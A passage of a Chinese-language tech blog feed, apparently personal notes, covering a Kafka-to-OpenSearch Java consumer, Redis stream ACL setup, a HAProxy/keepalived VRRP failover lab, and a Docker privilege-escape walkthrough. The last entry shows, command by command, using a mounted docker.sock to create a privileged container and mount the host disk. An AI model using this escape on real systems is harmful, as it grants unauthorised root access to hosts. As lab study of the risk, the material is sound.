final Thread mainThread = Thread.currentThread();  
  
Runtime.getRuntime().addShutdownHook(new Thread(){  
    public void run(){  
        log.info(&amp;quot;Detected a shutdown event&amp;quot;);  
        consumer.wakeup();  
  
        try {  
            mainThread.join();  
        } catch (InterruptedException e) {  
            e.printStackTrace();  
        }  
    }  
});
...
try(openSearchClient; consumer){  
    boolean indexExists = openSearchClient.indices().exists(new GetIndexRequest(indexName), RequestOptions.DEFAULT);  
    if (!indexExists){  
        // we need to create the index on opensearch if it doesn&#39;t exist already  
        CreateIndexRequest createIndexRequest = new CreateIndexRequest(indexName);  
        openSearchClient.indices().create(createIndexRequest, RequestOptions.DEFAULT);  
        log.info(&amp;quot;The wikimedia index has been created&amp;quot;);  
    } else {  
        log.info(&amp;quot;The wikimedia index already exists&amp;quot;);  
    }  
  
    while (true){  
        ConsumerRecords&amp;lt;String, String&amp;gt; records = consumer.poll(Duration.ofMillis(3000));  
  
        int recordCount = records.count();  
        log.info(&amp;quot;Received &amp;quot; + recordCount + &amp;quot; record(s)&amp;quot;);  
        BulkRequest bulkRequest = new BulkRequest();  
        for (ConsumerRecord&amp;lt;String, String&amp;gt; record : records){  
            try{  
                String id = extractId(record.value());  
                // send the record into opensearch  
                IndexRequest indexRequest = new IndexRequest(indexName)  
                        .source(record.value(), XContentType.JSON)  
                        .id(id);  
                //IndexResponse indexResponse = openSearchClient.index(indexRequest, RequestOptions.DEFAULT);  
                bulkRequest.add(indexRequest);  
            } catch (Exception e){  
  
            }  
        }  
        if (bulkRequest.numberOfActions() &amp;gt; 0){  
            BulkResponse bulkResponse = openSearchClient.bulk(bulkRequest, RequestOptions.DEFAULT);  
            log.info(&amp;quot;Inserted &amp;quot; + bulkResponse.getItems().length + &amp;quot; record(s).&amp;quot;);  
            try {  
                Thread.sleep(1000);  
            } catch (InterruptedException e) {  
                e.printStackTrace();  
            }  
  
        }  
  
        consumer.commitAsync();  
        log.info(&amp;quot;offset have been committed!&amp;quot;);  
    }  
} catch (WakeupException e){  
    log.info(&amp;quot;Consumer is starting to shutdown&amp;quot;);  
} catch (Exception e){  
    log.error(&amp;quot;unexpected exception: &amp;quot;, e);  
} finally {  
    consumer.close(); // close the consumer, this will also commit offest to kafka.  
    openSearchClient.close();  
    log.info(&amp;quot;The consumer is now gracefully shut down&amp;quot;);  
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Consumer offset reset 行為/" >
        </entry>
        <entry>
            <title>
                Redis stream 訂閱權限設定
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Redis/Redis stream 訂閱權限設定/</id>
            <content type="html">
                &lt;p&gt;Redis ACL&lt;br /&gt;
&lt;a href=&quot;https://redis.io/docs/latest/operate/oss_and_stack/management/security/acl/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://redis.io/docs/latest/operate/oss_and_stack/management/security/acl/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;stream&quot; tabindex=&quot;-1&quot;&gt;建立 Stream&lt;/h2&gt;
&lt;p&gt;Redis Stream 是「&lt;strong&gt;lazy creation&lt;/strong&gt;」，也就是只要你往一個 key 寫入資料，它就會自動建立。&lt;/p&gt;
&lt;h3 id=&quot;code-mystream-code-stream&quot; tabindex=&quot;-1&quot;&gt;建立一個名為 &lt;code&gt;mystream&lt;/code&gt; 的 Stream&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;XADD mystream * message &amp;quot;Hello World&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt; → 自動生成 ID（timestamp-based）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;message &amp;quot;Hello World&amp;quot;&lt;/code&gt; → 欄位與值，可以一次放多個欄位&lt;br /&gt;
執行後，&lt;code&gt;mystream&lt;/code&gt; 就存在了。&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218135834.png&quot; alt=&quot;Pasted image 20251218135834.png&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;stream-channel&quot; tabindex=&quot;-1&quot;&gt;列出所有 stream channel&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;SCAN 0 TYPE stream
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218140101.png&quot; alt=&quot;Pasted image 20251218140101.png&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;mystream&quot; tabindex=&quot;-1&quot;&gt;建立只能訂閱 mystream 的使用者&lt;/h3&gt;
&lt;p&gt;語法如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ACL SETUSER stream_user on &amp;gt;StrongPassword +XREAD +XREADGROUP +XRANGE +XINFO ~{{YOUR_STREAM_NAME}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;example:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ACL SETUSER stream_user on &amp;gt;YOUR_PASSWORD +XREAD +XREADGROUP +XRANGE +XINFO ~mystream
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;[!NOTE]&lt;br /&gt;
stream_user → 新使用者名稱&lt;br /&gt;
on → 啟用帳號&lt;br /&gt;
YOUR_PASSWORD → 密碼&lt;br /&gt;
+XREAD +XREADGROUP +XRANGE +XINFO → 允許讀取 Stream 的命令&lt;br /&gt;
~my-stream → 只允許存取這個 key，其他 Stream key 都不能存取。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;acl-redis&quot; tabindex=&quot;-1&quot;&gt;使用受 ACL 權限控管的使用者連線到 Redis&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;redis-cli -u redis://stream_user:YOUR_PASSWORD@127.0.0.1:6379
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218140714.png&quot; alt=&quot;Pasted image 20251218140714.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;連線後只要操作 &lt;code&gt;my-stream&lt;/code&gt; 可以成功，其他 Stream key 會出現權限錯誤：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;XREAD COUNT 1 STREAMS mystream 0   # 成功 XREAD COUNT 1 
STREAMS other-stream 0 # 失敗 -&amp;gt; No Permissions to access a key
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251218140855.png&quot; alt=&quot;Pasted image 20251218140855.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最後記得 &lt;code&gt;acl save&lt;/code&gt;  持久化保存&lt;br /&gt;
如何做 ACL 持久化請參閱&lt;br /&gt;
&lt;a class=&quot;internal-link is-unresolved&quot; href=&quot;https://hung-jia-jun.github.io/404&quot; target=&quot;&quot;&gt;Redis ACL 持久化&lt;/a&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Redis/Redis stream 訂閱權限設定/" >
        </entry>
        <entry>
            <title>
                HA proxy VRRP 研究
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Proxy/HA proxy VRRP 研究/</id>
            <content type="html">
                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#haproxy&quot;&gt;#haproxy&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#vrrp&quot;&gt;#vrrp&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#linux&quot;&gt;#linux&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#keepalived&quot;&gt;#keepalived&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#proxy&quot;&gt;#proxy&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;vrrp-virtual-router-redundancy-protocol&quot; tabindex=&quot;-1&quot;&gt;VRRP(Virtual Router Redundancy Protocol)&lt;/h1&gt;
&lt;p&gt;主要實現工具是 keepalived，他會透過 vrrp 廣播 master 的心跳，一但 master 死掉，Backup 就會代替 Master 回覆指定 IP 的 arp request。&lt;br /&gt;
兩台主機上都有 HA Proxy，接收到請求後會再傳到後端 server&lt;/p&gt;
&lt;h2 id=&quot;架構圖&quot; tabindex=&quot;-1&quot;&gt;架構圖&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122113609.png&quot; alt=&quot;Pasted image 20241122113609.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;參考教學 : &lt;a href=&quot;https://medium.com/@abhilashkulkarni340/vrrp-and-4-simple-steps-to-set-it-up-on-ubuntu-454c46abb3b4&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://medium.com/@abhilashkulkarni340/vrrp-and-4-simple-steps-to-set-it-up-on-ubuntu-454c46abb3b4&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;安裝&quot; tabindex=&quot;-1&quot;&gt;安裝&lt;/h2&gt;
&lt;h3 id=&quot;haproxy&quot; tabindex=&quot;-1&quot;&gt;haproxy&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt install haproxy
$ haproxy -v
HA-Proxy version 2.0.33-0ubuntu0.1 2023/10/31 - https://haproxy.org/
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;keepalived&quot; tabindex=&quot;-1&quot;&gt;keepalived&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ apt-get install keepalived
$ systemctl status keepalived
● keepalived.service - Keepalive Daemon (LVS and VRRP)
     Loaded: loaded (/lib/systemd/system/keepalived.service; enabled; vendor preset: enabled)
     Active: inactive (dead)
  Condition: start condition failed at Thu 2024-11-21 13:47:53 CST; 2h 11min ago

Nov 21 13:47:53 jason-2 systemd[1]: Condition check resulted in Keepalive Daemon (LVS and VRRP) being skipped.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;出現 inactive 是正常的，因為沒有 keepalived 的設定檔&lt;/p&gt;
&lt;p&gt;所以要從 keepalived config sample 裡面拿到範例設定檔&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cp /usr/share/doc/keepalived/samples/keepalived.conf.sample /etc/keepalived/keepalived.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;vrrp&quot; tabindex=&quot;-1&quot;&gt;VRRP 主備切換環境&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122103718.png&quot; alt=&quot;Pasted image 20241122103718.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;設定檔&quot; tabindex=&quot;-1&quot;&gt;設定檔&lt;/h2&gt;
&lt;p&gt;jason-1(Master)、jason-2(Backup) 兩台測試機的設定檔都要放&lt;/p&gt;
&lt;h3 id=&quot;jason-1-master&quot; tabindex=&quot;-1&quot;&gt;jason-1(Master)&lt;/h3&gt;
&lt;p&gt;/etc/haproxyhaproxy.cfg&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;global
	log /dev/log	local0
	log /dev/log	local1 notice
	chroot /var/lib/haproxy
	stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
	stats timeout 30s
	user haproxy
	group haproxy
	daemon

	# Default SSL material locations
	ca-base /etc/ssl/certs
	crt-base /etc/ssl/private

	# See: https://ssl-config.mozilla.org/#server=haproxy&amp;amp;server-version=2.0.3&amp;amp;config=intermediate
        ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
        ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets

defaults
	log	global
	mode	http
	option	httplog
	option	dontlognull
        timeout connect 5000
        timeout client  50000
        timeout server  50000
	errorfile 400 /etc/haproxy/errors/400.http
	errorfile 403 /etc/haproxy/errors/403.http
	errorfile 408 /etc/haproxy/errors/408.http
	errorfile 500 /etc/haproxy/errors/500.http
	errorfile 502 /etc/haproxy/errors/502.http
	errorfile 503 /etc/haproxy/errors/503.http
	errorfile 504 /etc/haproxy/errors/504.http

frontend firstbalance
    bind *:80
    option forwardfor
    default_backend webservers

backend webservers
    balance roundrobin
    server test-2 10.xx.x.154:8080 check &amp;lt;-- 這個要指定後端 server 位置
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;/etc/keepalived/keepalived.conf&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;! Configuration File for keepalived

global_defs {
   router_id LVS_DEVEL
}

vrrp_instance VI_1 {
    state MASTER # 路由器的首選狀態 - MASTER 或 BACKUP
    interface ens160 # IP 位址綁定的介面。它還必須添加到 virtual_ipaddress 部分
    unicast_src_ip 10.xx.x.153 # 目前路由器的IP位址
    unicast_peer{ 
        10.xx.x.154 # VRRP中其他路由器的IP位址
    } 
    virtual_router_id 50
    # nopreempt # nopreempt允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。
    priority 101 # 優先權：該路由器在其他路由器中的優先權
    advert_int 1
    virtual_ipaddress {
	    10.xx.x.160 # 此部分用於新增虛擬 IP 位址 (VIP)。請注意它如何與 src_ip 和對等點位於同一網路中。
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;jason-2-backup&quot; tabindex=&quot;-1&quot;&gt;jason-2(Backup)&lt;/h3&gt;
&lt;p&gt;/etc/haproxyhaproxy.cfg&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;global
	log /dev/log	local0
	log /dev/log	local1 notice
	chroot /var/lib/haproxy
	stats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners
	stats timeout 30s
	user haproxy
	group haproxy
	daemon

	# Default SSL material locations
	ca-base /etc/ssl/certs
	crt-base /etc/ssl/private

	# See: https://ssl-config.mozilla.org/#server=haproxy&amp;amp;server-version=2.0.3&amp;amp;config=intermediate
        ssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        ssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
        ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets

defaults
	log	global
	mode	http
	option	httplog
	option	dontlognull
        timeout connect 5000
        timeout client  50000
        timeout server  50000
	errorfile 400 /etc/haproxy/errors/400.http
	errorfile 403 /etc/haproxy/errors/403.http
	errorfile 408 /etc/haproxy/errors/408.http
	errorfile 500 /etc/haproxy/errors/500.http
	errorfile 502 /etc/haproxy/errors/502.http
	errorfile 503 /etc/haproxy/errors/503.http
	errorfile 504 /etc/haproxy/errors/504.http
frontend firstbalance
    bind *:80
    option forwardfor
    default_backend webservers

backend webservers
    server test-2 172.xx.x.1:8080 check
    # option httpchk
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;/etc/keepalived/keepalived.conf&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;! Configuration File for keepalived

global_defs {
   router_id LVS_DEVEL
}
vrrp_instance VI_1 {
    interface ens160
    state BACKUP
    unicast_src_ip 10.xx.x.154
    unicast_peer{ 
        10.xx.x.153
    } 
    virtual_router_id 50
    # nopreempt
    priority 101
    advert_int 1
    virtual_ipaddress {
	    10.xx.x.160
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;[!TIP] Tip: nopreempt&lt;br /&gt;
允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。&lt;br /&gt;
發生情境:&lt;br /&gt;
其中一台設置為master，一台設置為backup。 當master出現異常后，backup自動切換為master。 當backup成為master后，master恢復正常后會再次搶佔成為master，導致不必要的主備切換。 因此可以將兩台keepalived初始狀態均配置為backup，設置不同的優先順序，優先順序高的設置nopreempt解決異常恢復后再次搶佔的問題。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2 id=&quot;執行&quot; tabindex=&quot;-1&quot;&gt;執行&lt;/h2&gt;
&lt;p&gt;jason-1(Master)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo systemctl restart keepalived
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;jason-2(Backup)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo systemctl restart keepalived
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;jason-2 這台目前是 BACKUP mode&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241121162744.png&quot; alt=&quot;Pasted image 20241121162744.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;實驗&quot; tabindex=&quot;-1&quot;&gt;實驗&lt;/h2&gt;
&lt;p&gt;目前狀態&lt;/p&gt;
&lt;p&gt;jason-1 - Master&lt;br /&gt;
jason-2 - Backup&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241121163855.png&quot; alt=&quot;Pasted image 20241121163855.png&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;jason-3&quot; tabindex=&quot;-1&quot;&gt;jason-3 觀測機&lt;/h4&gt;
&lt;p&gt;arp table 測試&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo arping 10.xx.x.160
60 bytes from 00:xx:xx:xx:xx:88 (10.xx.x.160): index=1 time=517.786 usec
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;現在 &lt;code&gt;10.xx.x.160&lt;/code&gt; 是 jason-1(00:xx:xx:xx:88) 所負責的&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122105210.png&quot; alt=&quot;Pasted image 20241122105210.png&quot; /&gt;&lt;br /&gt;
查看 arp table&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ arp -a
...
? (10.xx.x.160) at 00:xx:xx:xx:xx:88 [ether] on ens160
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;關閉 jason-1(Master)&lt;br /&gt;
sudo systemctl stop keepalived&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104314.png&quot; alt=&quot;Pasted image 20241122104314.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;發現 jason-2(Backup) 主機接手 Master 位置&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251217231432.png&quot; alt=&quot;Pasted image 20251217231432.png&quot; /&gt;&lt;br /&gt;
到 jason-3 探測機，發現已經迅速切換主備位置了&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104433.png&quot; alt=&quot;Pasted image 20241122104433.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;arp table 也同步更新&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104539.png&quot; alt=&quot;Pasted image 20241122104539.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;服務也未中斷&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020241122104608.png&quot; alt=&quot;Pasted image 20241122104608.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;vrrp-1&quot; tabindex=&quot;-1&quot;&gt;VRRP工作原理&lt;/h2&gt;
&lt;p&gt;ref: &lt;a href=&quot;https://info.support.huawei.com/info-finder/encyclopedia/zh/VRRP.html&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://info.support.huawei.com/info-finder/encyclopedia/zh/VRRP.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;當Master設備出現故障時，路由器B和路由器C會選舉出新的Master設備。 新的Master設備開始回應對虛擬IP位址的&lt;a href=&quot;https://info.support.huawei.com/info-finder/encyclopedia/zh/ARP.html&quot; title=&quot;ARP&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;ARP&lt;/a&gt;回應，並定期發送VRRP通告報文。&lt;/p&gt;
&lt;p&gt;VRRP的詳細工作過程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;VRRP備份組中的設備根據優先順序選舉出Master。 Master設備通過發送&lt;a href=&quot;https://info.support.huawei.com/info-finder/encyclopedia/zh/ARP.html&quot; title=&quot;ARP&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;免費ARP&lt;/a&gt;報文，將虛擬MAC位址通知給與它連接的設備或者主機，從而承擔報文轉發任務。&lt;/li&gt;
&lt;li&gt;Master設備週期性向備份組內所有Backup設備發送VRRP通告報文，通告其配置資訊（優先順序等）和工作狀況。&lt;/li&gt;
&lt;li&gt;如果Master設備出現故障，VRRP備份組中的Backup設備將根據優先順序重新選舉新的Master。&lt;/li&gt;
&lt;li&gt;VRRP備份組狀態切換時，Master設備由一台設備切換為另外一台設備，新的Master設備會立即發送攜帶虛擬路由器的虛擬MAC位址和虛擬IP位址資訊的免費ARP報文，刷新與它連接的設備或者主機的MAC表項，從而把使用者流量引到新的Master設備上來，整個過程對使用者完全透明。&lt;/li&gt;
&lt;li&gt;原Master設備故障恢復時，若該設備為IP位址擁有者（優先順序為255），將直接切換至Master狀態。 若該設備優先順序小於255，將首先切換至Backup狀態，且其優先順序恢復為故障前配置的優先順序。&lt;/li&gt;
&lt;li&gt;Backup設備的優先順序高於Master設備時，由Backup設備的工作方式（搶佔方式和非搶佔方式）決定是否重新選舉Master。&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/Proxy/HA proxy VRRP 研究/" >
        </entry>
        <entry>
            <title>
                docker 特權逃逸
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/Docker/docker 特權逃逸/</id>
            <content type="html">
                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#docker&quot;&gt;#docker&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;起因&quot; tabindex=&quot;-1&quot;&gt;起因&lt;/h2&gt;
&lt;p&gt;因為 docker daemon 是在 root 權限下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ll -a /var/run/docker.sock
lrwxr-xr-x  1 root  daemon    63B Jun 10 23:39 /var/run/docker.sock -&amp;gt; /Users/jason/.local/share/containers/podman/machine/podman.sock
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以只要能跟 host 的 docker 通訊到，就能透過 docker api 啟動特權容器，進一步取得系統資訊&lt;/p&gt;
&lt;p&gt;建立特權容器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 使用 curlimages/curl 作為基礎鏡像
FROM curlimages/curl:latest

USER root
# 安裝 sudo
RUN apk --no-cache add sudo

RUN apk --no-cache add docker

# 創建一個新用戶並設置適當的權限
RUN addgroup -S docker &amp;amp;&amp;amp; adduser -S dockeruser -G docker

# 允許 dockeruser 使用 sudo 而不需要密碼
RUN echo &#39;dockeruser ALL=(ALL) NOPASSWD:ALL&#39; &amp;gt;&amp;gt; /etc/sudoers

# 切換到 dockeruser 用戶
USER dockeruser

# 設置工作目錄
WORKDIR /home/dockeruser

# 執行一個無限循環的命令，確保容器一直保持運行
CMD [&amp;quot;sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;while :; do sleep 10; done&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker build -t my-curl-image .
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;docker-conatiner&quot; tabindex=&quot;-1&quot;&gt;建立 docker conatiner&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;docker run -it -v /var/run/docker.sock:/var/run/docker.sock my-curl sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;container-docker-sock-unix-host-docker&quot; tabindex=&quot;-1&quot;&gt;在 container 內使用 docker.sock 的 unix 套接字與 host 的 docker 通訊&lt;/h2&gt;
&lt;h3 id=&quot;docker-images&quot; tabindex=&quot;-1&quot;&gt;建立一個 docker images&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ curl -X POST --unix-socket /var/run/docker.sock -d &#39;{&amp;quot;Image&amp;quot;:&amp;quot;my-curl&amp;quot;, &amp;quot;Privileged&amp;quot;:true}&#39; -H &#39;Content-Type: application/json&#39; http:/v1.24/containers/create
{&amp;quot;Id&amp;quot;:&amp;quot;315083c9a1035f5f7950eb3302333c17cbd4b6794c61da6be5076763a1ad3330&amp;quot;,&amp;quot;Warnings&amp;quot;:[]}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;docker-images-1&quot; tabindex=&quot;-1&quot;&gt;啟動 docker images&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ curl -X POST --unix-socket /var/run/docker.sock http:/v1.24/containers/8746e88c9097720c0f6f6a0ab6f4a7fe6677b14c08df9483a71abdab7cad7cbf/start
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;docker-container&quot; tabindex=&quot;-1&quot;&gt;列出所有 docker container 狀態&lt;/h3&gt;
&lt;p&gt;等價:&lt;br /&gt;
&lt;code&gt;docker ps&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/home/dockeruser # curl --unix-socket /var/run/docker.sock http:/v1.24/containers/json
[{&amp;quot;Id&amp;quot;:&amp;quot;a9c0fe2d7af9aaf0a2154643c5155ad4eae5254d295528dab4cfde2b42fcf6fa&amp;quot;,&amp;quot;Names&amp;quot;:[&amp;quot;/elated_leakey&amp;quot;],&amp;quot;Image&amp;quot;:&amp;quot;my-curl&amp;quot;,&amp;quot;ImageID&amp;quot;:&amp;quot;sha256:77db03e61147c124f23eda7c588cbd21959fc4645462821877028c8b5236faec&amp;quot;,&amp;quot;Command&amp;quot;:&amp;quot;/entrypoint.sh sh -c &#39;while :; do sleep 10; done&#39;&amp;quot;,&amp;quot;Created&amp;quot;:1718034
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;container&quot; tabindex=&quot;-1&quot;&gt;進入建立的特權 container&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ docker ps
CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS     NAMES
a9c0fe2d7af9   my-curl   &amp;quot;/entrypoint.sh sh -…&amp;quot;   3 minutes ago   Up 3 minutes             elated_leakey

$ docker exec -it a9c0fe2d7af9 sh
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;device&quot; tabindex=&quot;-1&quot;&gt;可以看到宿主機的 device&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;/dev # ls
autofs           hvc3             loop6            nbd3             ram1             ram9             tty14            tty27            tty4             tty52            tty8             vda
btrfs-control    hvc4             loop7            nbd4             ram10            random           tty15            tty28            tty40            tty53            tty9             vda1
bus              hvc5             mapper           nbd5             ram11            rtc0             tty16            tty29            tty41            tty54            ttyS0            vdb
cachefiles       hvc6             mem              nbd6             ram12            shm              tty17            tty3             tty42            tty55            ttyS1            vdc
core             hvc7             mqueue           nbd7             ram13            stderr           tty18            tty30            tty43            tty56            ttyS2            vga_arbiter
cpu_dma_latency  hwrng            nbd0             nbd8             ram14            stdin            tty19            tty31            tty44            tty57            ttyS3            vhost-net
cuse             kmsg             nbd1             nbd9             ram15            stdout           tty2             tty32            tty45            tty58            uinput           vhost-vsock
fd               loop-control     nbd10            net              ram2             tty              tty20            tty33            tty46            tty59            urandom          vport2p0
full             loop0            nbd11            null             ram3             tty0             tty21            tty34            tty47            tty6             vcs              vsock
fuse             loop1            nbd12            port             ram4             tty1             tty22            tty35            tty48            tty60            vcs1             zero
gpiochip0        loop2            nbd13            ppp              ram5             tty10            tty23            tty36            tty49            tty61            vcsa
hvc0             loop3            nbd14            ptmx             ram6             tty11            tty24            tty37            tty5             tty62            vcsa1
hvc1             loop4            nbd15            pts              ram7             tty12            tty25            tty38            tty50            tty63            vcsu
hvc2             loop5            nbd2             ram0             ram8             tty13            tty26            tty39            tty51            tty7             vcsu1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改 host 文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ mount dev/vda1 /home/vda1
/dev # ls /home/vda1
cni                 desktop-containerd  kubeadm             lost+found          mutagen             swap
containerd          docker              kubelet-plugins     machine-id          nfs                 wasm
&lt;/code&gt;&lt;/pre&gt;

            </content>
